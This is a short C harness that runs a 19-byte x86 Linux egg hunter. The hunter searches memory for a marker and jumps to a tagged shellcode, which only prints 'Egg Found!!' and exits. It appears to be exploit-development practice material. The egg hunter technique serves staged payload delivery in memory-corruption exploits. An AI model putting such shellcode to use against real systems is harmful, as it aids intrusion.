#include<stdio.h>
#include<string.h>

// Egg hunter 19 bytes
unsigned char egghunter[] = \
"\xb8\x72\x80\x04\x08\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75"
"\xfb\xff\xe0\x01";

// Print 'Egg Found!!' on screen
unsigned char shellcode[] = \
"\x90\x50\x90\x50" // egg mark
"\xeb\x16\x59\x31\xc0\x50\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2"
"\x0c\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe5\xff\xff\xff\x45"
"\x67\x67\x20\x46\x6f\x75\x6e\x64\x21\x21\x0a";

main()
{
        printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
        int (*ret)() = (int(*)())egghunter;
        ret();
}

